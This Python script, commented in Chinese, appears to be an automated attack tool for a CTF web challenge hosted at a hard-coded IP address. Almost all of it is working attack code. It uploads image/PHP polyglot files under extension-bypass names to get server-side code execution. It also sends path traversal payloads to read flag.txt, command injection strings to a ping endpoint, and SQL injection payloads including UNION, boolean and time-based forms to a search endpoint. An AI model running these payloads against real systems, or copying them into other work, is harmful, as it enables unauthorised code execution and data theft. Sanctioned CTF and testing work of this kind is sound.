import requests
import re
import base64

requests.packages.urllib3.disable_warnings()

TARGET = "http://119.29.238.216:8088"
TIMEOUT = 15

session = requests.Session()
session.verify = False
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
})

FLAGS_FOUND = []


def add_flag(location, content, method=""):
    FLAGS_FOUND.append({"location": location, "content": content, "method": method})
    print(f"\n  🚩 发现FLAG! [{method}]")
    print(f"     位置: {location}")
    print(f"     内容: {content}")


def check_flag_pattern(text):
    patterns = [
        r'flag\{[^}]+\}',
        r'FLAG\{[^}]+\}',
        r'ctf\{[^}]+\}',
        r'CTF\{[^}]+\}',
        r'f[l1]ag\{[^}]+\}',
    ]
    for pattern in patterns:
        matches = re.findall(pattern, text, re.IGNORECASE)
        for match in matches:
            return match
    return None


def print_section(title):
    print("\n" + "=" * 70)
    print(f"  {title}")
    print("=" * 70)


def test_uploaded_files():
    """测试上传目录中的文件"""
    print_section("1. 测试上传文件")
    
    uploaded_files = [
        "29c62af68a5c4e12aa8b28be5f41f9df_test.php.jpg",
        "4f7105e4ac734f13ab9e1cdaad24128d.gif",
        "572279e9bc5c4cf79d754e57fb2e38bf.gif",
        "b55ba29d54334b9ab42b35c618128fcf.png",
        "d0fa8509503c438a872c3364419d210c.gif",
        "e09ee5dc21394c2583c6e45c511986f0.gif",
        "ed9555cdf521",
    ]
    
    for filename in uploaded_files:
        url = f"{TARGET}/uploads/{filename}"
        try:
            r = session.get(url, timeout=TIMEOUT)
            
            if r.status_code == 200:
                content_type = r.headers.get('Content-Type', '')
                print(f"\n  [{r.status_code}] /uploads/{filename}")
                print(f"     Content-Type: {content_type}")
                
                # 检查是否执行了PHP
                if content_type == "text/html" or content_type == "text/plain":
                    content = r.text[:500]
                    print(f"     内容: {content}")
                    
                    flag = check_flag_pattern(content)
                    if flag:
                        add_flag(f"/uploads/{filename}", flag, "文件内容")
                
                # 如果是图片，检查是否包含PHP代码
                elif "image" in content_type:
                    content = r.content
                    if b"<?php" in content:
                        print(f"     ⚠️  图片中包含PHP代码!")
                        add_flag(f"/uploads/{filename}", "图片包含PHP代码", "图片内容")
                        
        except Exception as e:
            print(f"  错误: {e}")


def test_file_upload_bypass():
    """测试文件上传漏洞绕过"""
    print_section("2. 文件上传漏洞测试")
    
    url = f"{TARGET}/upload"
    
    # 获取CSRF token
    r = session.get(url, timeout=TIMEOUT)
    csrf = re.search(r'name=["\']csrf["\']\s*value=["\']([^"\']+)["\']', r.text)
    csrf_token = csrf.group(1) if csrf else ""
    print(f"  CSRF Token: {csrf_token}")
    
    # 构造恶意图片文件 - 包含PHP代码
    # JPEG: \xff\xd8开头，\xff\xd9结尾
    malicious_jpg = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xdb\x00\x43\x00\x03\x02\x02\x02\x02\x02\x03\x02\x02\x02\x03\x03\x03\x03\x04\x06\x04\x04\x04\x04\x04\x08\x06\x06\x05\x06\x09\x08\x0a\x0a\x09\x08\x09\x09\x0a\x0c\x0f\x0c\x0a\x0b\x0e\x0b\x09\x09<?php echo 'test_php_exec'; ?>\xff\xd9"
    
    # GIF: GIF89a开头，;结尾
    malicious_gif = b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x01\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x4c\x01\x00;<?php echo 'test_php_exec'; ?>"
    
    # PNG: \x89PNG开头，IEND结尾
    malicious_png = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x10\x00\x00\x00\x10\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\x04sBIT\x08\x08\x08\x08|\x88|\x88l\x88l\x88\x00\x00\x00\x1dIDATx\x9c\xed\xc1\x01\r\x00\x00\x00\xc2\xa0\xf7\xfd\xff?\xff\x00\x00\x00\x05\xff\x00\xff\x00\xff\x00\xff\x00\x00\x00\x00IEND\xaeB`\x82<?php echo 'test_php_exec'; ?>"
    
    test_files = [
        ("test.php.jpg", "image/jpeg", malicious_jpg),
        ("test.jpg.php", "image/jpeg", malicious_jpg),
        ("test.phtml", "image/jpeg", malicious_jpg),
        ("test.php", "image/jpeg", malicious_jpg),
        ("test.gif.php", "image/gif", malicious_gif),
        ("test.php.gif", "image/gif", malicious_gif),
        ("test.png.php", "image/png", malicious_png),
        ("test.php.png", "image/png", malicious_png),
        ("test.asp.jpg", "image/jpeg", malicious_jpg),
        ("test.aspx.jpg", "image/jpeg", malicious_jpg),
        ("test.jsp.jpg", "image/jpeg", malicious_jpg),
    ]
    
    for filename, content_type, content in test_files:
        try:
            files = {"file": (filename, content, content_type)}
            r = session.post(url, files=files, data={"csrf": csrf_token}, timeout=TIMEOUT)
            
            if r.status_code == 200:
                if "上传成功" in r.text:
                    # 提取上传的文件名
                    uploaded_name = re.search(r'/uploads/([^"]+)', r.text)
                    if uploaded_name:
                        uploaded_url = f"{TARGET}/uploads/{uploaded_name.group(1)}"
                        print(f"\n  🎉 上传成功: {filename} -> {uploaded_url}")
                        
                        # 测试上传的文件是否可以执行
                        r2 = session.get(uploaded_url, timeout=TIMEOUT)
                        if "test_php_exec" in r2.text:
                            print(f"     ⚠️  PHP代码被执行!")
                            add_flag(f"/uploads/{uploaded_name.group(1)}", "PHP代码执行成功", "文件上传漏洞")
                        else:
                            print(f"     文件内容: {r2.text[:200]}")
                            
                else:
                    # 检查错误信息
                    notice = re.search(r'<p class="notice">(.*?)</p>', r.text)
                    if notice:
                        print(f"\n  ❌ 上传失败: {filename} - {notice.group(1)}")
                        
        except Exception as e:
            print(f"  错误: {e}")


def test_path_traversal():
    """测试路径遍历"""
    print_section("3. 路径遍历测试")
    
    backup_url = f"{TARGET}/backup"
    
    path_traversal_payloads = [
        "F:\\small peoject\\python-lab\\uploads\\..\\flag.txt",
        "F:\\small peoject\\python-lab\\uploads\\..\\..\\flag.txt",
        "F:\\small peoject\\python-lab\\uploads/../flag.txt",
        "F:\\small peoject\\python-lab\\uploads/../../flag.txt",
        "F:\\small peoject\\python-lab\\uploads\\..\\..\\..\\flag.txt",
        "/uploads/../flag.txt",
        "/uploads/../../flag.txt",
        "..\\flag.txt",
        "../flag.txt",
        "..\\..\\flag.txt",
        "../../flag.txt",
    ]
    
    for payload in path_traversal_payloads:
        try:
            r = session.get(backup_url, params={"path": payload}, timeout=TIMEOUT)
            
            if r.status_code == 200:
                content = r.text
                
                body_match = re.search(r'<pre>(.*?)</pre>', content, re.DOTALL)
                if body_match:
                    body_content = body_match.group(1)
                    
                    if "flag" in body_content.lower():
                        print(f"\n  [{r.status_code}] ?path={payload}")
                        print(f"     响应: {body_content}")
                        
                        flag = check_flag_pattern(body_content)
                        if flag:
                            add_flag(f"Backup路径遍历: {payload}", flag, "路径遍历")
                            
        except Exception as e:
            print(f"  错误: {e}")


def test_ping_bypass():
    """测试Ping命令注入绕过"""
    print_section("4. Ping命令注入测试")
    
    ping_url = f"{TARGET}/ping"
    
    # 尝试各种绕过方式
    ping_payloads = [
        "127.0.0.1&dir",
        "127.0.0.1|dir",
        "127.0.0.1`dir`",
        "127.0.0.1$(dir)",
        "127.0.0.1;dir",
        "127.0.0.1&&dir",
        "127.0.0.1||dir",
        "127.0.0.1%0a%0adir",
        "127.0.0.1%0d%0adir",
        "127.0.0.1%09dir",
        "127.0.0.1%20%26%26%20dir",
        "127.0.0.1%20%7C%20dir",
        "127.0.0.1\n dir",
        "127.0.0.1\r\n dir",
        "0; dir",
        "0| dir",
        "0&& dir",
        "0`dir`",
        "0$(dir)",
        "localhost; dir",
        "localhost|dir",
        "127.1; dir",
        "127.0.0.1.1; dir",
        "[127.0.0.1]; dir",
        "127.0.0.1' && dir",
        "127.0.0.1' || dir",
    ]
    
    for payload in ping_payloads:
        try:
            r = session.get(ping_url, params={"host": payload}, timeout=TIMEOUT)
            
            if r.status_code == 200:
                body_match = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
                if body_match:
                    body_content = body_match.group(1)
                    
                    if "Blocked" not in body_content and len(body_content) > 100:
                        print(f"\n  [{r.status_code}] ?host={payload}")
                        print(f"     响应: {body_content[:500]}")
                        
                        flag = check_flag_pattern(body_content)
                        if flag:
                            add_flag(f"Ping命令执行: {payload}", flag, "命令执行")
                            
        except Exception as e:
            print(f"  错误: {e}")


def test_sql_bypass():
    """测试SQL注入绕过"""
    print_section("5. SQL注入测试")
    
    sql_url = f"{TARGET}/search"
    
    sql_payloads = [
        "SQL",
        "sql",
        "sQL",
        "s'QL",
        "sq'L",
        "sql' --",
        "sql'#",
        "sql' OR 1=1",
        "sql' OR '1'='1",
        "1' OR 1=1",
        "1' OR '1'='1",
        "admin' OR 1=1",
        "admin' OR '1'='1",
        "1' UNION SELECT 1,2,3",
        "1' UNION SELECT 1,version(),3",
        "1' UNION SELECT 1,database(),3",
        "' OR 1=1",
        "\" OR 1=1",
        "' OR 'a'='a",
        "\" OR \"a\"=\"a",
        "1' ORDER BY 1",
        "1' ORDER BY 2",
        "1' ORDER BY 3",
        "0' UNION SELECT 1,2,3",
        "-1' OR 1=1",
        "1' LIMIT 0,1",
        "1' OFFSET 1",
        "1' AND SLEEP(1)",
        "1' AND BENCHMARK(1000000,MD5(1))",
    ]
    
    for payload in sql_payloads:
        try:
            r = session.get(sql_url, params={"q": payload}, timeout=TIMEOUT)
            
            if r.status_code == 200:
                body_match = re.search(r'<main[^>]*>(.*?)</main>', r.text, re.DOTALL)
                if body_match:
                    body_content = body_match.group(1)
                    
                    # 检查是否有数据泄露
                    if "flag" in body_content.lower() or "root" in body_content.lower() or "admin" in body_content.lower():
                        print(f"\n  [{r.status_code}] ?q={payload}")
                        print(f"     响应: {body_content[:500]}")
                        
                        flag = check_flag_pattern(body_content)
                        if flag:
                            add_flag(f"SQL注入: {payload}", flag, "SQL查询结果")
                            
        except Exception as e:
            print(f"  错误: {e}")


def main():
    print("*" * 70)
    print("  CTF漏洞深度测试")
    print("  目标: " + TARGET)
    print("*" * 70)
    
    test_uploaded_files()
    test_file_upload_bypass()
    test_path_traversal()
    test_ping_bypass()
    test_sql_bypass()
    
    print_section("检测结果汇总")
    
    if FLAGS_FOUND:
        print(f"\n  🎉 共发现 {len(FLAGS_FOUND)} 个FLAG!")
        for i, flag_info in enumerate(FLAGS_FOUND):
            print(f"\n  [{i+1}] {flag_info['method']}")
            print(f"      位置: {flag_info['location']}")
            print(f"      FLAG: {flag_info['content']}")
    else:
        print("\n  ❌ 未发现FLAG")
        print("\n  已测试模块:")
        print("     - 上传文件测试")
        print("     - 文件上传漏洞测试")
        print("     - 路径遍历测试")
        print("     - Ping命令注入测试")
        print("     - SQL注入测试")
    
    print()


if __name__ == "__main__":
    main()